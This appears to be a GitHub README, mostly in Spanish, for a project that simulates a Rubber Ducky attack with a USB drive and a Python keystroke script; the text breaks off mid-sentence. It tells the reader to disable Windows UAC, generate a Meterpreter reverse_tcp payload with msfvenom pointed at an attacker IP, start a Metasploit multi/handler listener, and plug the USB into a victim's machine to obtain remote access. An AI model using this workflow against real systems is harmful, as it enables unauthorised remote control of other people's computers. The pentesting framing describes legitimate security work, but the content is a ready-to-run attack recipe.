# Rubber-Ducky-Simulation
In this project, we simulate a Rubber Ducky using a standard USB drive with a Python script and autorun functionality. This allows us to replicate its keystroke execution capabilities for automated penetration testing. The project emphasizes scripting skills and highlights the security risks of USB devices in cybersecurity.

## Instrucciones de Uso

Primero, descargaremos los archivos del repositorio y los copiaremos en cualquier USB. Luego, editaremos los archivos según nuestras necesidades, ajustando los tiempos que consideremos adecuados para la ejecución de la secuencia de desactivación del archivo `teclas.py`. 

Es importante tener en cuenta que debemos desactivar el Control de Cuentas de Usuario (UAC) en el sistema Windows de la siguiente manera:

1. Abrir el **Panel de control**.
2. Ir a **Cuentas de usuario**.
3. Seleccionar **Cambiar configuración de Control de cuentas de usuario**.
4. Mover el control deslizante a **Nunca notificar**.
5. Hacer clic en **Aceptar** y reiniciar el sistema si es necesario.

Esta configuración permitirá que el archivo `teclas.py` se ejecute sin restricciones de permisos.

![image](https://github.com/user-attachments/assets/59126bcb-c0c4-48ff-81c1-20f607277a46)

## Instrucciones de Uso (Continuación)

Una vez desactivadas las restricciones de UAC y editado el código con los tiempos a nuestra conveniencia, procederemos a convertir el código en un ejecutable utilizando **PyInstaller**. 

Luego, en nuestra máquina atacante, crearemos el payload con el siguiente comando:

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IPAtacante LPORT=PuertoAtacante -f exe -o shell.exe
```
Una vez generado, copiaremos el payload en la USB

Si deseamos que la USB se ejecute automáticamente en el sistema de la víctima, es necesario que la máquina tenga instalado apo_usb_autorun debido a las restricciones de windows. Si no es así, tendremos que hacer doble clic manualmente en el archivo ejecutable teclas.exe.

Después de esto, nos pondremos en escucha en nuestra IP y puerto asignados en el payload con el siguiente comando:

```bash
msfconsole -e use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST IPAtacante
set LPORT PuertoAtacante
run
```
Finalmente, insertaremos la USB en la máquina de la víctima y esperaremos el acceso remoto.


Recuerda reemplazar `IPAtacante` y `PuertoAtacante` con los valores correspondientes. También 
